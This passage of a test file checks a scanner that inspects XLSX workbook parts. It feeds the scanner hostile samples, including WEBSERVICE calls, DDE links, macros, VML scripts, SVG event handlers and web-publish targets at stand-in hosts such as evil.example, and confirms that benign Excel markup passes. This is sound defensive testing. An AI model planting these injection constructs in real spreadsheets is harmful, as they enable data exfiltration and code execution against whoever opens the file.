      worksheetWithAfter(
        `<hyperlinks><hyperlink ref="A1" location="'\\\\evil.example\\s\\[x.xlsx]S'!A1"/></hyperlinks>`,
      ),
    ],
    [
      'a camera tool range calling WEBSERVICE',
      DRAWING_PART,
      drawingWith(
        `<xdr:pic macro=""><xdr:nvPicPr><xdr:cNvPr id="2" name="p"><a:extLst xmlns:a="urn:a"><a:ext uri="{84589F7E-364E-4C9E-8A38-B11213B215E9}"><a14:cameraTool xmlns:a14="urn:a14" cellRange="${EVIL_CALL}" spid="_x0000_s1025"/></a:ext></a:extLst></xdr:cNvPr></xdr:nvPicPr></xdr:pic>`,
      ),
    ],
    [
      'a conditional format formula',
      SHEET_PART,
      worksheetWithAfter(
        `<conditionalFormatting sqref="A1"><cfRule type="expression" priority="1"><formula>LEN(${EVIL_CALL})&gt;0</formula></cfRule></conditionalFormatting>`,
      ),
    ],
    [
      'a conditional format DDE link',
      SHEET_PART,
      worksheetWithAfter(
        `<conditionalFormatting sqref="A1"><cfRule type="expression" priority="1"><formula>${DDE_LINK}</formula></cfRule></conditionalFormatting>`,
      ),
    ],
    [
      'a table calculated column formula',
      'xl/tables/table1.xml',
      `${UTF8_DECLARATION}<table xmlns="${SPREADSHEET_NS}" id="1" name="T" displayName="T" ref="A1:A2"><tableColumns count="1"><tableColumn id="1" name="c"><calculatedColumnFormula>${EVIL_CALL}</calculatedColumnFormula></tableColumn></tableColumns></table>`,
    ],
    [
      'a table totals row formula',
      'xl/tables/table1.xml',
      `${UTF8_DECLARATION}<table xmlns="${SPREADSHEET_NS}" id="1" name="T" displayName="T" ref="A1:A2"><tableColumns count="1"><tableColumn id="1" name="c"><totalsRowFormula>${EVIL_CALL}</totalsRowFormula></tableColumn></tableColumns></table>`,
    ],
    [
      'a chart series DDE link',
      'xl/charts/chart1.xml',
      `${UTF8_DECLARATION}<c:chartSpace xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart"><c:chart><c:plotArea><c:barChart><c:ser><c:val><c:numRef><c:f>${DDE_LINK}</c:f></c:numRef></c:val></c:ser></c:barChart></c:plotArea></c:chart></c:chartSpace>`,
    ],
    [
      'a pivot cache calculated field',
      'xl/pivotCache/pivotCacheDefinition1.xml',
      `${UTF8_DECLARATION}<pivotCacheDefinition xmlns="${SPREADSHEET_NS}" refreshOnLoad="1"><cacheFields count="1"><cacheField name="x" formula="${EVIL_CALL}" databaseField="0"/></cacheFields></pivotCacheDefinition>`,
    ],
    ...PIVOT_FIELD_REFUSALS.map(([label, formula]): [string, string, string] => [
      `a pivot cache calculated field ${label}`,
      PIVOT_CACHE_PART,
      pivotCacheWith(`<cacheField name="Toplam" formula="${formula}" databaseField="0"/>`),
    ]),
    [
      'a pivot calculated item calling WEBSERVICE',
      PIVOT_TABLE_PART,
      pivotTableWith(
        `<calculatedItem formula="'Q1/Q2'*${EVIL_CALL}"><pivotArea/></calculatedItem>`,
      ),
    ],
    [
      'a quoted path in the text link of a pivot cache field',
      PIVOT_CACHE_PART,
      pivotCacheWith(`<cacheField name="x" link="'C:\\x\\[a.xlsx]S'!A1"/>`),
    ],
    [
      'a chart series bound to a name of another workbook',
      CHART_PART,
      chartWithSeries('[1]!SalesRange'),
    ],
    ...OMML_FIELD_REFUSALS.map(([label, after]): [string, string, string] => [
      `an f ${label}`,
      SHEET_PART,
      worksheetWithAfter(after),
    ]),
    [
      'a shape text link calling WEBSERVICE',
      DRAWING_PART,
      drawingWith(`<xdr:sp macro="" textlink="${EVIL_CALL}"/>`),
    ],
    ['a shape macro', DRAWING_PART, drawingWith(`<xdr:sp macro="${DDE_LINK}" textlink=""/>`)],
    ['a picture macro in another case', DRAWING_PART, drawingWith('<xdr:pic Macro="[0]!m"/>')],
    [
      'a form control macro',
      'xl/ctrlProps/ctrlProp1.xml',
      `${UTF8_DECLARATION}<formControlPr xmlns="urn:x14" objectType="Button" fmlaMacro="[0]!Button1_Click"/>`,
    ],
    [
      'a form control cell link',
      'xl/ctrlProps/ctrlProp1.xml',
      `${UTF8_DECLARATION}<formControlPr xmlns="urn:x14" objectType="CheckBox" fmlaLink="${DDE_LINK}"/>`,
    ],
    ['a VML button macro', VML_PART, vmlWith(`<x:FmlaMacro>${EVIL_CALL}</x:FmlaMacro>`)],
    [
      'a VML button macro holding a comment',
      VML_PART,
      vmlWith('<x:FmlaMacro><!--m--></x:FmlaMacro>'),
    ],
    ['a VML cell link', VML_PART, vmlWith(`<x:FmlaLink>${DDE_LINK}</x:FmlaLink>`)],
    ['a VML list range', VML_PART, vmlWith('<x:FmlaRange>[1]Sheet1!A1</x:FmlaRange>')],
    ['a link attribute', SHEET_PART, worksheetWithAfter(`<z link="${DDE_LINK}"/>`)],
    [
      'a formula field in a shared strings part',
      SHARED_STRINGS_PART,
      `${UTF8_DECLARATION}<sst xmlns="${SPREADSHEET_NS}"><si><t>x</t></si><f>WEBSERVICE("x")</f></sst>`,
    ],
    [
      'a formula in a second root element',
      'xl/worksheets/sheet7.xml',
      `${UTF8_DECLARATION}<x/>${worksheetWithFormula('<f>WEBSERVICE("x")</f>').slice(UTF8_DECLARATION.length)}`,
    ],
    [
      'an f past an end tag with no element open',
      DRAWING_PART,
      `${UTF8_DECLARATION}<a xmlns:m="${OMML_NS}"></a></b><c xmlns:m="${OMML_NS}"><m:f>${EVIL_CALL}</m:f></c>`,
    ],
    [
      'a revision log old formula calling WEBSERVICE',
      REVISION_LOG_PART,
      revisionLogWith(`<formula>S!$A$1</formula><oldFormula>${EVIL_CALL}</oldFormula>`),
    ],
    [
      'a chart data name called in an Excel 2016+ chart',
      CHART_EX_PART,
      chartExWith('_xlchart.v1.0(&quot;x&quot;)'),
    ],
    ...URL_FRAGMENTS.map((location): [string, string, string] => [
      `a hyperlink location ${location} without a relationship id`,
      SHEET_PART,
      worksheetWithAfter(hyperlinkWith('', location)),
    ]),
    [
      'a hyperlink location whose r prefix the hyperlink binds to another namespace',
      SHEET_PART,
      worksheetWithAfter(hyperlinkWith('xmlns:r="urn:x" r:id="rId1"', EVIL_CALL)),
    ],
    [
      'a hyperlink location beside an id without a prefix',
      SHEET_PART,
      worksheetWithAfter(hyperlinkWith('id="rId1"', EVIL_CALL)),
    ],
    [
      'a hyperlink location beside an empty relationship id',
      SHEET_PART,
      worksheetWithAfter(hyperlinkWith('r:id=""', EVIL_CALL)),
    ],
    [
      'a hyperlink location beside a relationship id in another case',
      SHEET_PART,
      worksheetWithAfter(hyperlinkWith('r:ID="rId1"', EVIL_CALL)),
    ],
    [
      'a hyperlink location with a relationship id past an end tag that closes the root early',
      SHEET_PART,
      worksheetWithAfter(`<a></worksheet>${hyperlinkWith('r:id="rId1"', EVIL_CALL)}</a>`),
    ],
    [
      'a pivot calculated item whose item selector never closes',
      PIVOT_TABLE_PART,
      pivotTableWith(
        `<calculatedItem formula="'${URUN_GRUBU}'[Elektronik*1.1"><pivotArea/></calculatedItem>`,
      ),
    ],
    [
      'a pivot calculated item with a sheet right after its item selector',
      PIVOT_TABLE_PART,
      pivotTableWith(
        `<calculatedItem formula="'${URUN_GRUBU}'[x]Sheet1!A1"><pivotArea/></calculatedItem>`,
      ),
    ],
    [
      'a pivot calculated item calling WEBSERVICE after an item selector',
      PIVOT_TABLE_PART,
      pivotTableWith(
        `<calculatedItem formula="'${URUN_GRUBU}'[x]*${EVIL_CALL}"><pivotArea/></calculatedItem>`,
      ),
    ],
    [
      'a VML script',
      VML_PART,
      vmlWith('<x:ScriptText>window.open(&quot;http://evil.example/&quot;)</x:ScriptText>'),
    ],
    ['a VML script holding a comment', VML_PART, vmlWith('<x:ScriptText><!--s--></x:ScriptText>')],
    ['a VML script in another case', VML_PART, vmlWith('<x:scripttext>x</x:scripttext>')],
  ])('refuses %s', (_label, entry, xml) => {
    expectUnsafeFormula(scanError(entriesOf({ [entry]: xml })), entry);
  });

  it.each<[label: string, entry: string, xml: string]>([
    [
      'an oleObjects element',
      SHEET_PART,
      worksheetWithAfter('<oleObjects><oleObject progId="Package" shapeId="1025"/></oleObjects>'),
    ],
    [
      'an oleObject element holding a DDE link',
      SHEET_PART,
      worksheetWithAfter(`<oleObject progId="Package" link="${DDE_LINK}" shapeId="1025"/>`),
    ],
    [
      'a controls element',
      SHEET_PART,
      worksheetWithAfter('<controls><control shapeId="1025" r:id="rId1"/></controls>'),
    ],
    ['a control element', SHEET_PART, worksheetWithAfter('<control shapeId="1025" r:id="rId1"/>')],
    [
      'a web publishing item',
      SHEET_PART,
      worksheetWithAfter(
        '<webPublishItems count="1"><webPublishItem id="1" divId="d" sourceType="sheet" destinationFile="\\\\evil.example\\s\\x.htm" autoRepublish="1"/></webPublishItems>',
      ),
    ],
    [
      'a web publishing object',
      WORKBOOK_PART,
      workbookWith(
        '<webPublishObjects count="1"><webPublishObject id="1" divId="d" destinationFile="http://evil.example/drop.htm" autoRepublish="1"/></webPublishObjects>',
      ),
    ],
    ...VML_URL_REFUSALS.map(([label, shapes]): [string, string, string] => [
      label,
      VML_PART,
      vmlShapes(shapes),
    ]),
    [
      'an xlink:href to a web page in a drawing',
      DRAWING_PART,
      drawingWith(
        '<a:x xmlns:a="urn:a" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://evil.example/"/>',
      ),
    ],
    ...SVG_REFUSALS.map(([label, content]): [string, string, string] => [
      label,
      SVG_PART,
      svgWith(content),
    ]),
    [
      'an SVG image with a stylesheet instruction',
      SVG_PART,
      `<?xml-stylesheet href="http://evil/a.css"?>${svgWith('')}`,
    ],
    [
      'a stylesheet instruction in a worksheet, its target in another case',
      SHEET_PART,
      worksheetWithAfter('<?XML-Stylesheet type="text/xsl" href="a.xsl"?>'),
    ],
    // An on* attribute is an event handler on an SVG, XHTML or XML Events element, in a
    // part whose root is svg, and wherever the walk cannot follow the nesting.
    [
      'an SVG root in another case and namespace whose shape has an event handler',
      SVG_PART,
      '<SVG xmlns="urn:x"><rect onclick="x"/></SVG>',
    ],
    ['an SVG root with an onload handler', SVG_PART, `<svg ${SVG_NAMESPACES} onload="x"/>`],
    [
      'an SVG element with an event handler in a drawing',
      DRAWING_PART,
      drawingWith('<s:rect xmlns:s="http://www.w3.org/2000/svg" onclick="x"/>'),
    ],
    [
      'an XHTML element in the default namespace with an event handler in a drawing',
      DRAWING_PART,
      drawingWith('<div xmlns="http://www.w3.org/1999/xhtml"><p onmouseover="x"/></div>'),
    ],
    [
      'an XML Events element with an event handler',
      DRAWING_PART,
      drawingWith('<e:x xmlns:e="http://www.w3.org/2001/xml-events" onactivate="x"/>'),
    ],
    [
      'an SVG element whose namespace is written with a character reference',
      DRAWING_PART,
      drawingWith('<s:rect xmlns:s="http://www.w3.org/2000/sv&#103;" onclick="x"/>'),
    ],
    [
      'an element whose namespace the scan cannot decode',
      DRAWING_PART,
      drawingWith('<s:rect xmlns:s="urn:&#1114112;" onclick="x"/>'),
    ],
    [
      'an element whose prefix is declared twice, once for SVG',
      DRAWING_PART,
      drawingWith('<s:rect xmlns:s="urn:x" xmlns:s="http://www.w3.org/2000/svg" onclick="x"/>'),
    ],
    [
      'an event handler past an end tag with no element open',
      DRAWING_PART,
      `${UTF8_DECLARATION}<a></a></b><c onclick="x"/>`,
    ],
    [
      'an event handler on the f inside an x14 data validation formula',
      SHEET_PART,
      worksheetWithAfter(
        '<x14:dataValidation xmlns:x14="urn:x14" xmlns:xm="urn:xm"><x14:formula1><xm:f onclick="x">A1</xm:f></x14:formula1></x14:dataValidation>',
      ),
    ],
    // SVG animation and web resource attributes, in the scope of the event handlers.
    [
      'an SVG set that points an href at a web address in a drawing',
      DRAWING_PART,
      drawingWith(
        '<svg:set xmlns:svg="http://www.w3.org/2000/svg" attributeName="href" to="http://e/x"/>',
      ),
    ],
    [
      'an SVG animate in a drawing',
      DRAWING_PART,
      drawingWith(
        '<s:animate xmlns:s="http://www.w3.org/2000/svg" attributeName="href" values="http://e/x"/>',
      ),
    ],
    [
      'an SVG animateMotion in a drawing',
      DRAWING_PART,
      drawingWith('<s:animateMotion xmlns:s="http://www.w3.org/2000/svg" dur="1s"/>'),
    ],
    [
      'a set in an SVG root of another namespace',
      SVG_PART,
      '<svg xmlns="urn:x"><set attributeName="href" to="http://e/x"/></svg>',
    ],
    [
      'a set past an end tag with no element open',
      DRAWING_PART,
      `${UTF8_DECLARATION}<a></a></b><set attributeName="x" to="y"/>`,
    ],
    [
      'an SVG image with a data attribute in a drawing',
      DRAWING_PART,
      drawingWith('<svg:image xmlns:svg="http://www.w3.org/2000/svg" data="x"/>'),
    ],
    [
      'an XHTML form action in a drawing',
      DRAWING_PART,
      drawingWith('<h:form xmlns:h="http://www.w3.org/1999/xhtml" action="x"/>'),
    ],
    [
      'an empty XHTML ping in another case',
      DRAWING_PART,
      drawingWith('<h:a xmlns:h="http://www.w3.org/1999/xhtml" PING=""/>'),
    ],
    [
      'a data attribute on the f inside an x14 data validation formula',
      SHEET_PART,
      worksheetWithAfter(
        '<x14:dataValidation xmlns:x14="urn:x14" xmlns:xm="urn:xm"><x14:formula1><xm:f data="x">A1</xm:f></x14:formula1></x14:dataValidation>',
      ),
    ],
  ])('refuses %s as unsafe-part', (_label, entry, xml) => {
    expectUnsafePart(scanError(entriesOf({ [entry]: xml })), entry);
  });

  it.each<[label: string, entry: string, xml: string]>([
    [
      'a defined name holding a sheet range',
      WORKBOOK_PART,
      workbookWith(
        `<definedNames><definedName name="_xlnm._FilterDatabase" localSheetId="0" hidden="1">'${URUNLER}'!$A$1:$AE$56</definedName></definedNames>`,
      ),
    ],
    [
      'the 3ve4 data validation list',
      SHEET_PART,
      worksheetWithAfter(
        '<dataValidations count="1"><dataValidation type="list" sqref="T2:T34" allowBlank="true"><formula1>OFFSET($Z2,0,0,1,COUNTA($Z2:$AB2))</formula1></dataValidation></dataValidations>',
      ),
    ],
    [
      "Excel's empty macro and text link on a shape",
      DRAWING_PART,
      drawingWith('<xdr:sp macro="" textlink=""/>'),
    ],
    [
      'a shape text link to a cell',
      DRAWING_PART,
      drawingWith('<xdr:sp macro="" textlink="$A$1"/>'),
    ],
    [
      'a picture link to a relationship',
      DRAWING_PART,
      drawingWith('<xdr:pic><a:blip xmlns:a="urn:a" r:link="rId1"/></xdr:pic>'),
    ],
    ['an empty VML button macro', VML_PART, vmlWith('<x:FmlaMacro/><x:FmlaMacro></x:FmlaMacro>')],
    ['a VML cell link to a cell', VML_PART, vmlWith('<x:FmlaLink>$A$1</x:FmlaLink>')],
    [
      'a namespace declaration whose prefix is a field name',
      SHEET_PART,
      worksheetWithAfter('<z xmlns:link="urn:a|b" xmlns:formula="urn:[x]"/>'),
    ],
    [
      'the text of a shared string',
      SHARED_STRINGS_PART,
      `${UTF8_DECLARATION}<sst xmlns="${SPREADSHEET_NS}"><si><t>WEBSERVICE("x")</t></si></sst>`,
    ],
    [
      'VML formulas of a shape type',
      VML_PART,
      `<xml ${VML_NAMESPACES}><v:shapetype id="_x0000_t202"><v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/></v:formulas></v:shapetype></xml>`,
    ],
    [
      'an x14 data validation list from another sheet',
      SHEET_PART,
      worksheetWithAfter(
        '<x14:dataValidation xmlns:x14="urn:x14" xmlns:xm="urn:xm"><x14:formula1><xm:f>Sheet2!$A$1:$A$5</xm:f></x14:formula1></x14:dataValidation>',
      ),
    ],
    [
      'x14 data validation formulas with white space around their f',
      SHEET_PART,
      worksheetWithAfter(
        '<x14:dataValidation xmlns:x14="urn:x14" xmlns:xm="urn:xm" type="whole">' +
          '<x14:formula1>\n  <xm:f>Lists!$A$2</xm:f>\n</x14:formula1>' +
          '<x14:formula2> <xm:f xmlns:xm="urn:xm">Lists!$A$3</xm:f> </x14:formula2></x14:dataValidation>',
      ),
    ],
    [
      'the x14 data validation list Excel 2010+ writes',
      SHEET_PART,
      worksheetWithAfter(
        '<extLst><ext xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main" uri="{CCE6A557-97BC-4b89-ADB6-D9C93CAAB3DF}">' +
          '<x14:dataValidations xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main" count="1">' +
          '<x14:dataValidation type="list" allowBlank="1" showInputMessage="1" showErrorMessage="1">' +
          '<x14:formula1><xm:f>Listeler!$A$2:$A$20</xm:f></x14:formula1><xm:sqref>B2:B500</xm:sqref>' +
          '</x14:dataValidation></x14:dataValidations></ext></extLst>',
      ),
    ],
    [
      'conditional format value objects of every type',
      SHEET_PART,
      worksheetWithAfter(
        '<conditionalFormatting sqref="A1:A10"><cfRule type="iconSet" priority="1"><iconSet>' +
          '<cfvo type="num" val="-1.5E+3"/><cfvo type="percent" val="50"/><cfvo type="percentile" val="90"/>' +
          '<cfvo type="formula" val="$A$1"/><cfvo type="formula" val="Sheet2!$B$1*2"/><cfvo type="min"/><cfvo type="max" val=""/>' +
          '</iconSet></cfRule></conditionalFormatting>',
      ),
    ],
    [
      'hyperlink locations to a quoted sheet, a cell and a defined name',
      SHEET_PART,
      worksheetWithAfter(
        `<hyperlinks><hyperlink ref="A1" location="'Sheet 2'!A1" display="x"/><hyperlink ref="A2" location="'${URUNLER}'!B2"/>` +
          '<hyperlink ref="A3" location="C5"/><hyperlink ref="A4" location="MyName"/><hyperlink ref="A5" r:id="rId1"/></hyperlinks>',
      ),
    ],
    [
      'a camera tool range',
      DRAWING_PART,
      drawingWith(
        '<xdr:pic macro=""><xdr:nvPicPr><xdr:cNvPr id="2" name="p"><a14:cameraTool xmlns:a14="urn:a14" cellRange="Sheet1!$A$1:$B$2" spid="_x0000_s1025"/></xdr:cNvPr></xdr:nvPicPr></xdr:pic>',
      ),
    ],
    [
      'a pivot calculated field whose quoted field name holds a slash',
      PIVOT_CACHE_PART,
      pivotCacheWith(
        `<cacheField name="Fiyat/Adet" numFmtId="0"/><cacheField name="Adet" numFmtId="0"/><cacheField name="Toplam" numFmtId="0" formula="'Fiyat/Adet' *Adet" databaseField="0"/>`,
      ),
    ],
    [
      'a pivot calculated item whose quoted field names hold a slash and a bracket',
      PIVOT_TABLE_PART,
      pivotTableWith(`<calculatedItem formula="'Q1/Q2'*2+'[Kalan]'"><pivotArea/></calculatedItem>`),
    ],
    [
      'a chart series bound to a defined name of this workbook',
      CHART_PART,
      chartWithSeries('[0]!SalesRange'),
    ],
    [
      'an Office Math fraction in a drawing text box, the prefix bound on the root',
      DRAWING_PART,
      `${UTF8_DECLARATION}<xdr:wsDr xmlns:xdr="${DRAWING_NS}" xmlns:a="urn:a" xmlns:m="${OMML_NS}">` +
        '<xdr:twoCellAnchor><xdr:sp macro="" textlink=""><xdr:txBody><a:p><a14:m xmlns:a14="urn:a14">' +
        `<m:oMathPara>${OMML_FRACTION}</m:oMathPara></a14:m></a:p></xdr:txBody></xdr:sp></xdr:twoCellAnchor></xdr:wsDr>`,
    ],
    [
      'an Office Math fraction whose prefix an ancestor binds',
      DRAWING_PART,
      drawingWith(
        `<xdr:sp macro="" textlink=""><a14:m xmlns:a14="urn:a14"><m:oMathPara xmlns:m="${OMML_NS}">${OMML_FRACTION}${OMML_FRACTION}</m:oMathPara></a14:m></xdr:sp>`,
      ),
    ],
    [
      'an Office Math fraction in the OMML default namespace',
      DRAWING_PART,
      drawingWith(`<oMath xmlns="${OMML_NS}"><f><fPr/><num/><den/></f></oMath>`),
    ],
    [
      'an Office Math fraction deep inside the element binding OMML',
      DRAWING_PART,
      drawingWith(
        `<a14:m xmlns:a14="urn:a14" xmlns:m="${OMML_NS}">${deeplyNested(OMML_FRACTION)}</a14:m>`,
      ),
    ],
    ['the data names of an Excel 2016+ chart', CHART_EX_PART, chartExWith('_xlchart.v1.0')],
    [
      'a revision log old formula holding a range',
      REVISION_LOG_PART,
      revisionLogWith('<formula>S!$A$1</formula><oldFormula>S!$A$1:$A$9</oldFormula>'),
    ],
    [
      'pivot calculated items naming items of a quoted field',
      PIVOT_TABLE_PART,
      pivotTableWith(
        `<calculatedItem formula="'${URUN_GRUBU}'[Elektronik]*1.1"><pivotArea/></calculatedItem>` +
          `<calculatedItem formula="'${URUN_GRUBU}'[-1]"><pivotArea/></calculatedItem>` +
          `<calculatedItem formula="'${URUN_GRUBU}'['[x']]+Grup[Ev]"><pivotArea/></calculatedItem>`,
      ),
    ],
    ['a VML comment shape as Excel writes it', VML_PART, VML_COMMENT],
    ['a VML header image as Excel writes it', VML_PART, VML_HEADER_IMAGE],
    [
      'relative VML image, fill and shape links',
      VML_PART,
      vmlShapes(
        '<v:shape id="h" type="#_x0000_t75" href="#Sheet1!A1"><v:imagedata src="../media/image1.png" o:title=""/>' +
          '<v:fill src="media/bg.png" type="frame"/></v:shape><v:shape id="e" src=""/>',
      ),
    ],
    ['empty VML scripts', VML_PART, vmlWith('<x:ScriptText/><x:ScriptText> \n </x:ScriptText>')],
    [
      'relative VML alternative and base links',
      VML_PART,
      vmlShapes(
        '<v:shape id="h" type="#_x0000_t75" xml:base="media/"><v:imagedata src="x.png" o:althref="y.png"/>' +
          '<v:fill o:althref="" type="frame"/></v:shape>',
      ),
    ],
    [
      'an Office Math fraction after a nested AlternateContent that declares nothing',
      DRAWING_PART,
      drawingWith(
        `<mc:AlternateContent xmlns:mc="${MARKUP_COMPATIBILITY_NS}" xmlns:m="${OMML_NS}"><mc:Choice Requires="a14">` +
          '<mc:AlternateContent><mc:Choice Requires="a14"/></mc:AlternateContent>' +
          `${OMML_FRACTION}</mc:Choice></mc:AlternateContent>`,
      ),
    ],
    [
      'an SVG logo whose picture is an image data URI, in either case',
      SVG_PART,
      svgWith(
        '<defs><pattern id="p0" width="1" height="1"><use xlink:href="#image0"/></pattern>' +
          '<image id="image0" width="1" height="1" xlink:href="data:image/png;base64,iVBORw0KGgo="/>' +
          '<image id="image1" width="1" height="1" href="DATA:IMAGE/jpeg;base64,/9j/4AAQ"/></defs>' +
          '<rect width="1" height="1" fill="url(#p0)"/>',
      ),
    ],
    [
      'SVG styles whose url( ) targets are fragments',
      SVG_PART,
      svgWith(
        '<style>/* Logo */ .a{fill:url(#grad1)} .b{fill:url( "#grad2" )}</style>' +
          "<style><![CDATA[.c{fill:url('#grad3')}]]></style>" +
          '<rect class="a" width="1" height="1" style="fill:url(#grad1)"/>',
      ),
    ],
    [
      'SVG paints, filters and clip paths from fragments of the image',
      SVG_PART,
      svgWith(
        '<rect width="1" height="1" fill="url(#grad1)" filter="url( \'#f1\' )" clip-path="URL(#c)"/>' +
          '<style>.a{fill:url(<!--x-->#g)}</style>',
      ),
    ],
    [
      'attribute values with parentheses or a backslash but no url(',
      VML_PART,
      vmlShapes(
        '<v:shape id="s" type="#_x0000_t75" o:title="Logo (v2) C:\\logo" alt="f(x) = urlx"/>',
      ),
    ],
    [
      'a VML title holding a backslash and no (',
      VML_PART,
      vmlShapes('<v:shape id="s" type="#_x0000_t75" o:title="C:\\logo"/>'),
    ],
    [
      'SVG colours written as functions, with no backslash',
      SVG_PART,
      svgWith('<rect width="1" height="1" fill="rgb(1,2,3)" stroke="hsl(0, 0%, 0%)"/>'),
    ],
    [
      'SVG url( ) fragments past quotes and white space, and quoted font names',
      SVG_PART,
      svgWith(
        `<rect width="1" height="1" fill="url( ' #f2' )"/>` +
          `<style>.a{fill:url(\n"#g"\n)} text{font-family:"Arial", 'Times New Roman'}</style>`,
      ),
    ],
    [
      'raster image data URIs on SVG images, in any media type case',
      SVG_PART,
      svgWith(
        '<image width="1" height="1" href="data:image/BMP;base64,Qk0="/>' +
          '<image width="1" height="1" xlink:href="data:image/jpg,x"/>',
      ),
    ],
    [
      'a raster image data URI on a VML image',
      VML_PART,
      vmlShapes(
        '<v:shape id="h" type="#_x0000_t75"><v:imagedata src="data:image/gif;base64,R0lGOD" o:title=""/></v:shape>',
      ),
    ],
    [
      'on attributes and prefixes outside the event handler namespaces',
      DRAWING_PART,
      drawingWith(
        '<a:x xmlns:a="urn:a" on="t" onx="1"/><z xmlns:one="http://www.w3.org/2000/svg"/>',
      ),
    ],
    [
      'a drawing shape style as Excel writes it',
      DRAWING_PART,
      drawingWith(
        '<xdr:sp macro="" textlink="" xmlns:a="urn:a"><xdr:style>' +
          '<a:lnRef idx="2"><a:schemeClr val="accent1"><a:shade val="50000"/></a:schemeClr></a:lnRef>' +
          '<a:fillRef idx="1"><a:schemeClr val="accent1"/></a:fillRef>' +
          '<a:fontRef idx="minor"><a:schemeClr val="lt1"/></a:fontRef></xdr:style></xdr:sp>',
      ),
    ],
    // Windows paths: a backslash that spells no CSS call passes.
    [
      'the absolute path Excel writes into a workbook saved in a folder with parentheses',
      WORKBOOK_PART,
      workbookWith(
        `<mc:AlternateContent xmlns:mc="${MARKUP_COMPATIBILITY_NS}"><mc:Choice Requires="x15">` +
          '<x15ac:absPath xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac" ' +
          'url="C:\\Users\\u\\Desktop\\Yeni klasor (2)\\"/></mc:Choice></mc:AlternateContent>',
      ),
    ],
    [
      'a picture description holding a path whose file name has parentheses',
      DRAWING_PART,
      drawingWith(
        '<xdr:pic macro=""><xdr:nvPicPr><xdr:cNvPr id="2" name="Picture 1" descr="C:\\x\\Trendyol(1).png"/></xdr:nvPicPr></xdr:pic>',
      ),
    ],
    [
      'a picture description holding a path with parentheses after a space and after hex letters',
      DRAWING_PART,
      drawingWith(
        '<xdr:pic macro=""><xdr:nvPicPr><xdr:cNvPr id="2" name="Picture 1" descr="C:\\a\\b (1)\\c(2).png"/></xdr:nvPicPr></xdr:pic>',
      ),
    ],
    [
      'a picture description holding a path with no parenthesis',
      DRAWING_PART,
      drawingWith(
        '<xdr:pic macro=""><xdr:nvPicPr><xdr:cNvPr id="2" name="Picture 1" descr="C:\\logo"/></xdr:nvPicPr></xdr:pic>',
      ),
    ],
    [
      'a defined name comment holding a path with parentheses',
      WORKBOOK_PART,
      workbookWith(
        '<definedNames><definedName name="x" comment="C:\\x\\y(1)">A1</definedName></definedNames>',
      ),
    ],
    // SVG animation names and web resource attributes outside the web namespaces.
    [
      'an OLAP set in a pivot cache definition',
      PIVOT_CACHE_PART,
      `${UTF8_DECLARATION}<pivotCacheDefinition xmlns="${SPREADSHEET_NS}" refreshOnLoad="0">` +
        '<cacheFields count="1"><cacheField name="x" numFmtId="0"/></cacheFields><tupleCache><sets count="1">' +
        '<set count="1" maxRank="1" setDefinition="{[Product].[All]}"><tpls c="1"><tpl fld="0" item="0"/></tpls></set>' +
        '</sets></tupleCache></pivotCacheDefinition>',
    ],
    [
      'data and action attributes of a custom namespace',
      DRAWING_PART,
      drawingWith('<c:x xmlns:c="urn:custom" data="1" action="go" c:data="2" c:ping=""/>'),
    ],
  ])('accepts %s', (_label, entry, xml) => {
    expect(scanError(entriesOf({ [entry]: xml }))).toBeNull();
  });

  const EXTERNAL_RID1 = hyperlinkIdsOf(SHEET_PART, ['rId1']);

  it.each<[label: string, attributes: string, location: string]>([
    ...URL_FRAGMENTS.map((location): [string, string, string] => [
      `whose location keeps the URL fragment ${location}`,
      'r:id="rId1"',
      location,
    ]),
    [
      'whose relationship id prefix the hyperlink binds',
      `xmlns:rel="${OFFICE_RELATIONSHIPS_NS}" rel:id="rId1"`,
      "Ali's",
    ],
    ['whose relationship id is written with a reference', 'r:id="rId&#49;"', "Ali's"],
  ])(
    'accepts a hyperlink to an external hyperlink of its part %s',
    (_label, attributes, location) => {
      const entries = entriesOf({
        [SHEET_PART]: worksheetWithAfter(hyperlinkWith(attributes, location)),
      });
      expect(scanError(entries, EXTERNAL_RID1)).toBeNull();
    },
  );

  it.each<[label: string, attributes: string, hyperlinks: ExternalHyperlinkIds]>([
    ['an id its part does not give an external hyperlink', 'r:id="rId99"', EXTERNAL_RID1],
    ['no external hyperlink ids at all', 'r:id="rId1"', new Map()],
    [
      'the external hyperlink ids of another part',
      'r:id="rId1"',
      hyperlinkIdsOf(SECOND_SHEET_PART, ['rId1']),
    ],
    [
      'a second relationship id that is not one',
      'r:id="rId1" xmlns:q="' + OFFICE_RELATIONSHIPS_NS + '" q:id="rId2"',
      EXTERNAL_RID1,
    ],
    ['an id in another ASCII case', 'r:id="RID1"', EXTERNAL_RID1],
  ])('scans the location of a hyperlink with %s as a formula', (_label, attributes, hyperlinks) => {
    const entries = entriesOf({
      [SHEET_PART]: worksheetWithAfter(hyperlinkWith(attributes, EVIL_CALL)),
    });
    expectUnsafeFormula(scanError(entries, hyperlinks));
  });

  // Only a hyperlink may name an external hyperlink of its part.
  it.each<[label: string, after: string, hyperlinks: ExternalHyperlinkIds]>([
    ['a sheet background picture', '<picture r:id="rId1"/>', EXTERNAL_RID1],
    [
      'a drawing, the id in another ASCII case of its name',
      '<drawing r:Id="rId1"/>',
      EXTERNAL_RID1,
    ],
    ['a picture whose id is written with a reference', '<picture r:id="rId&#49;"/>', EXTERNAL_RID1],
    [
      'a picture whose id prefix is bound to the strict relationships namespace',
      '<picture xmlns:s="http://purl.oclc.org/ooxml/officeDocument/relationships" s:id="rId1"/>',
      EXTERNAL_RID1,
    ],
    [
      'a picture whose id names an external hyperlink among other relationships',
      '<picture r:id="rId4"/>',
      hyperlinkIdsOf(SHEET_PART, [], ['rId4']),
    ],
    [
      'a picture past markup the strict lexer refuses',
      `<${LONG_S}/><picture r:id="rId9"/>`,
      EXTERNAL_RID1,
    ],
  ])('refuses %s that names an external hyperlink', (_label, after, hyperlinks) => {
    expectUnsafePart(scanError(entriesOf({ [SHEET_PART]: worksheetWithAfter(after) }), hyperlinks));
  });

  it.each<[label: string, after: string, hyperlinks: ExternalHyperlinkIds]>([
    ['a drawing of another id', '<drawing r:id="rId2"/>', EXTERNAL_RID1],
    ['an id with no prefix', '<sheetView id="rId1"/>', EXTERNAL_RID1],
    [
      'a picture of an id another part gives an external hyperlink',
      '<picture r:id="rId1"/>',
